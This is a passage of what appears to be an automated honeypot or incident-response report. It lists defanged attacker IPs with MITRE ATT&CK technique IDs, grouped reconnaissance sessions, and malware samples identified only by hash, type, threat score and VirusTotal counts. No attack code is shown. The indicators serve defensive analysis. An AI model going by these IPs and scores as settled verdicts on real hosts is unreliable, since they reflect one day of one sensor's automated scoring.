| IR-d5e679fa334c | HIGH | `160.22.106[.]87` | 2026-11-04 08:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4b936477f453 | HIGH | `160.22.106[.]87` | 2026-11-04 08:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f7e80cc50955 | HIGH | `72.46.87[.]211` | 2026-11-04 08:19 | Y | 3 | 0 | `T1078 · T1083` |
| IR-fde7833dd663 | HIGH | `91.186.216[.]80` | 2026-11-04 08:28 | Y | 4 | 0 | `T1078` |
| IR-d07add16373e | HIGH | `125.94.106[.]195` | 2026-11-04 08:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cd2d73a01db5 | HIGH | `125.94.106[.]195` | 2026-11-04 08:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0aad9e074892 | HIGH | `49.64.85[.]138` | 2026-11-04 08:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f85d2d82dc91 | HIGH | `49.64.85[.]138` | 2026-11-04 08:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96d210fbe722 | HIGH | `165.245.208[.]67` | 2026-11-04 08:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-02e09561aea1 | HIGH | `165.245.208[.]67` | 2026-11-04 08:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-467be7d1b81e | HIGH | `91.186.216[.]80` | 2026-11-04 08:48 | Y | 0 | 0 | `T1078` |
| IR-a9ab84ca38e1 | HIGH | `97.74.236[.]4` | 2026-11-04 08:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-48d33e182db3 | HIGH | `97.74.236[.]4` | 2026-11-04 08:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9925e68a1e86 | HIGH | `103.146.52[.]157` | 2026-11-04 08:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d2b9477e692e | HIGH | `103.146.52[.]157` | 2026-11-04 08:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b51d3d2085d1 | HIGH | `180.76.60[.]83` | 2026-11-04 08:53 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-64cb2c1f4fba | HIGH | `190.151.5[.]26` | 2026-11-04 09:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-774679751a11 | HIGH | `190.151.5[.]26` | 2026-11-04 09:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5bff31278971 | HIGH | `85.185.201[.]10` | 2026-11-04 09:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-658839a85c71 | HIGH | `85.185.201[.]10` | 2026-11-04 09:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-088be8a3b76c | HIGH | `190.244.24[.]186` | 2026-11-04 09:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-01af76e6eb34 | HIGH | `190.244.24[.]186` | 2026-11-04 09:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b18b272d2a07 | HIGH | `45.78.230[.]231` | 2026-11-04 09:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-133e67c190c4 | HIGH | `45.78.230[.]231` | 2026-11-04 09:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7d81bfca33f4 | HIGH | `31.150.151[.]34` | 2026-11-04 09:33 | Y | 1 | 1 | `T1021.004 · T1078 · T1105` |
| IR-55e8d7e93960 | HIGH | `31.150.151[.]34` | 2026-11-04 09:33 | Y | 2 | 0 | `T1059.004 · T1078 · T1222.002` |
| IR-570e8ab30f48 | HIGH | `51.254.103[.]32` | 2026-11-04 09:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c2ae6b74771 | HIGH | `51.254.103[.]32` | 2026-11-04 09:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4de895337be5 | HIGH | `202.141.8[.]255` | 2026-11-04 09:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2511009f957f | HIGH | `202.141.8[.]255` | 2026-11-04 09:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dcd34fff8ef6 | HIGH | `180.180.242[.]201` | 2026-11-04 09:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 98 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **4** | 2026-11-04 08:24 | 2026-11-04 14:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-11-04 03:14 | 2026-11-04 06:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | **3** | 2026-11-04 13:54 | 2026-11-04 16:07 | 3m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-04 09:11 | 2026-11-04 10:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-11-04 16:25 | 2026-11-04 18:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.128.102[.]108` | **2** | 2026-11-04 07:12 | 2026-11-04 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.128.102[.]108` | **2** | 2026-11-04 10:26 | 2026-11-04 12:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-11-04 17:52 | 2026-11-04 18:37 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.122[.]18` | 1 | 2026-11-04 14:46 | 2026-11-04 14:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-11-04 18:18 | 2026-11-04 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.96.221[.]200` | 1 | 2026-11-04 03:54 | 2026-11-04 03:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.130.214[.]139` | 1 | 2026-11-04 16:10 | 2026-11-04 16:10 | 6s | 0 | `T1592` | 🟢 LOW |
| `106.12.185[.]146` | 1 | 2026-11-04 13:55 | 2026-11-04 13:56 | 99s | 0 | `T1592` | 🟢 LOW |
| `106.120.205[.]138` | 1 | 2026-11-04 16:24 | 2026-11-04 16:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]143` | 1 | 2026-11-04 12:42 | 2026-11-04 12:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]46` | 1 | 2026-11-04 16:16 | 2026-11-04 16:16 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.249.192[.]148` | 1 | 2026-11-04 06:44 | 2026-11-04 06:45 | 32s | 0 | `T1592` | 🟢 LOW |
| `114.33.143[.]118` | 1 | 2026-11-04 11:04 | 2026-11-04 11:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.151.72[.]155` | 1 | 2026-11-04 02:59 | 2026-11-04 03:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | 1 | 2026-11-04 13:02 | 2026-11-04 13:04 | 87s | 0 | `T1592` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-11-04 04:26 | 2026-11-04 04:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.73[.]90` | 1 | 2026-11-04 17:00 | 2026-11-04 17:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.131[.]27` | 1 | 2026-11-04 07:37 | 2026-11-04 07:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.111[.]71` | 1 | 2026-11-04 03:51 | 2026-11-04 03:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]93` | 1 | 2026-11-04 07:44 | 2026-11-04 07:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.56[.]8` | 1 | 2026-11-04 09:02 | 2026-11-04 09:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.249.112[.]36` | 1 | 2026-11-04 03:21 | 2026-11-04 03:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.2.204[.]28` | 1 | 2026-11-04 15:42 | 2026-11-04 15:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `131.161.15[.]31` | 1 | 2026-11-04 04:33 | 2026-11-04 04:33 | 33s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-04 04:13 | 2026-11-04 04:14 | 87s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-04 06:26 | 2026-11-04 06:27 | 49s | 0 | `T1592` | 🟢 LOW |
| `139.135.67[.]94` | 1 | 2026-11-04 12:44 | 2026-11-04 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-11-04 18:10 | 2026-11-04 18:10 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.190.176[.]18` | 1 | 2026-11-04 12:37 | 2026-11-04 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.119[.]118` | 1 | 2026-11-04 04:27 | 2026-11-04 04:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.216[.]98` | 1 | 2026-11-04 06:21 | 2026-11-04 06:21 | 8s | 0 | `T1592` | 🟢 LOW |
| `143.202.105[.]144` | 1 | 2026-11-04 12:46 | 2026-11-04 12:46 | 34s | 0 | `T1592` | 🟢 LOW |
| `147.125.241[.]19` | 1 | 2026-11-04 11:57 | 2026-11-04 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.223.20[.]12` | 1 | 2026-11-04 04:24 | 2026-11-04 04:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.246.198[.]45` | 1 | 2026-11-04 16:39 | 2026-11-04 16:39 | 30s | 0 | `T1592` | 🟢 LOW |
| `160.155.197[.]138` | 1 | 2026-11-04 05:28 | 2026-11-04 05:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `165.245.199[.]76` | 1 | 2026-11-04 14:13 | 2026-11-04 14:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.212.106[.]27` | 1 | 2026-11-04 06:04 | 2026-11-04 06:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-11-04 16:12 | 2026-11-04 16:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.46.168[.]1` | 1 | 2026-11-04 06:21 | 2026-11-04 06:21 | 32s | 0 | `T1592` | 🟢 LOW |
| `179.0.182[.]250` | 1 | 2026-11-04 11:45 | 2026-11-04 11:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]2` | 1 | 2026-11-04 11:18 | 2026-11-04 11:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-04 18:18 | 2026-11-04 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-04 03:50 | 2026-11-04 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-04 09:00 | 2026-11-04 09:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.184.160[.]211` | 1 | 2026-11-04 12:57 | 2026-11-04 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.184.183[.]66` | 1 | 2026-11-04 04:39 | 2026-11-04 04:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.60[.]83` | 1 | 2026-11-04 08:53 | 2026-11-04 08:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.237.217[.]29` | 1 | 2026-11-04 10:53 | 2026-11-04 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.9.46[.]131` | 1 | 2026-11-04 10:14 | 2026-11-04 10:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.22.253[.]49` | 1 | 2026-11-04 08:02 | 2026-11-04 08:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-04 04:02 | 2026-11-04 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-04 18:07 | 2026-11-04 18:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-11-04 05:16 | 2026-11-04 05:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-11-04 10:12 | 2026-11-04 10:12 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]191` | 1 | 2026-11-04 17:11 | 2026-11-04 17:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.163.194[.]127` | 1 | 2026-11-04 15:52 | 2026-11-04 15:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-11-04 12:34 | 2026-11-04 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.172.68[.]73` | 1 | 2026-11-04 07:20 | 2026-11-04 07:20 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.71.65[.]20` | 1 | 2026-11-04 04:21 | 2026-11-04 04:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.3.155[.]8` | 1 | 2026-11-04 04:33 | 2026-11-04 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.60.61[.]127` | 1 | 2026-11-04 09:18 | 2026-11-04 09:18 | 9s | 0 | `T1592` | 🟢 LOW |
| `218.219.234[.]85` | 1 | 2026-11-04 04:17 | 2026-11-04 04:18 | 12s | 0 | `T1592` | 🟢 LOW |
| `221.229.220[.]180` | 1 | 2026-11-04 13:49 | 2026-11-04 13:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.128.171[.]39` | 1 | 2026-11-04 14:12 | 2026-11-04 14:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.128.240[.]75` | 1 | 2026-11-04 14:09 | 2026-11-04 14:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-04 11:08 | 2026-11-04 11:08 | 9s | 0 | `T1592` | 🟢 LOW |
| `31.184.195[.]248` | 1 | 2026-11-04 16:12 | 2026-11-04 16:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.41.88[.]88` | 1 | 2026-11-04 06:02 | 2026-11-04 06:02 | 12s | 0 | `T1592` | 🟢 LOW |
| `34.81.19[.]39` | 1 | 2026-11-04 05:10 | 2026-11-04 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.133[.]206` | 1 | 2026-11-04 06:23 | 2026-11-04 06:23 | 9s | 0 | `T1592` | 🟢 LOW |
| `35.210.138[.]136` | 1 | 2026-11-04 05:36 | 2026-11-04 05:36 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.210.85[.]137` | 1 | 2026-11-04 05:04 | 2026-11-04 05:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `36.255.97[.]33` | 1 | 2026-11-04 08:21 | 2026-11-04 08:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]238` | 1 | 2026-11-04 18:47 | 2026-11-04 18:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.110.46[.]252` | 1 | 2026-11-04 16:43 | 2026-11-04 16:44 | 60s | 0 | `T1592` | 🟢 LOW |
| `4.150.188[.]32` | 1 | 2026-11-04 06:36 | 2026-11-04 06:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `40.124.85[.]0` | 1 | 2026-11-04 12:51 | 2026-11-04 12:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `44.220.185[.]164` | 1 | 2026-11-04 04:56 | 2026-11-04 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.116.35[.]149` | 1 | 2026-11-04 17:59 | 2026-11-04 18:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | 1 | 2026-11-04 13:10 | 2026-11-04 13:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-11-04 04:10 | 2026-11-04 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-11-04 07:08 | 2026-11-04 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-04 16:07 | 2026-11-04 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.162.195[.]207` | 1 | 2026-11-04 18:41 | 2026-11-04 18:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.177.147[.]64` | 1 | 2026-11-04 10:12 | 2026-11-04 10:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.180.27[.]137` | 1 | 2026-11-04 05:28 | 2026-11-04 05:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-04 06:40 | 2026-11-04 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | 1 | 2026-11-04 07:08 | 2026-11-04 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-04 10:34 | 2026-11-04 10:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.220.10[.]131` | 1 | 2026-11-04 13:50 | 2026-11-04 13:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.46.118[.]109` | 1 | 2026-11-04 09:57 | 2026-11-04 09:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `62.210.198[.]27` | 1 | 2026-11-04 07:01 | 2026-11-04 07:01 | 31s | 0 | `T1592` | 🟢 LOW |
| `64.227.90[.]185` | 1 | 2026-11-04 08:20 | 2026-11-04 08:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-11-04 04:48 | 2026-11-04 04:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]83` | 1 | 2026-11-04 05:39 | 2026-11-04 05:39 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-04 04:19 | 2026-11-04 04:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]94` | 1 | 2026-11-04 09:10 | 2026-11-04 09:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]86` | 1 | 2026-11-04 12:33 | 2026-11-04 12:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]185` | 1 | 2026-11-04 08:30 | 2026-11-04 08:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]222` | 1 | 2026-11-04 12:34 | 2026-11-04 12:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]176` | 1 | 2026-11-04 12:33 | 2026-11-04 12:34 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]104` | 1 | 2026-11-04 12:34 | 2026-11-04 12:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]48` | 1 | 2026-11-04 12:33 | 2026-11-04 12:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]55` | 1 | 2026-11-04 17:31 | 2026-11-04 17:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]223` | 1 | 2026-11-04 10:31 | 2026-11-04 10:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `67.205.143[.]169` | 1 | 2026-11-04 03:01 | 2026-11-04 03:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-04 12:08 | 2026-11-04 12:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-04 17:14 | 2026-11-04 17:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]172` | 1 | 2026-11-04 12:25 | 2026-11-04 12:25 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-04 11:00 | 2026-11-04 11:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.124.59[.]154` | 1 | 2026-11-04 05:42 | 2026-11-04 05:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.152.99[.]77` | 1 | 2026-11-04 08:44 | 2026-11-04 08:45 | 66s | 0 | `T1592` | 🟢 LOW |
| `80.115.160[.]234` | 1 | 2026-11-04 15:39 | 2026-11-04 15:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.172.113[.]189` | 1 | 2026-11-04 15:08 | 2026-11-04 15:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.212.126[.]117` | 1 | 2026-11-04 11:40 | 2026-11-04 11:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `82.67.240[.]101` | 1 | 2026-11-04 11:44 | 2026-11-04 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.132.15[.]222` | 1 | 2026-11-04 09:27 | 2026-11-04 09:28 | 33s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]30` | 1 | 2026-11-04 04:10 | 2026-11-04 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]61` | 1 | 2026-11-04 04:10 | 2026-11-04 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.184.66[.]112` | 1 | 2026-11-04 03:29 | 2026-11-04 03:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `88.199.167[.]10` | 1 | 2026-11-04 12:03 | 2026-11-04 12:04 | 34s | 0 | `T1592` | 🟢 LOW |
| `88.230.90[.]200` | 1 | 2026-11-04 06:18 | 2026-11-04 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.97.194[.]124` | 1 | 2026-11-04 12:19 | 2026-11-04 12:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.240.112[.]190` | 1 | 2026-11-04 09:02 | 2026-11-04 09:03 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
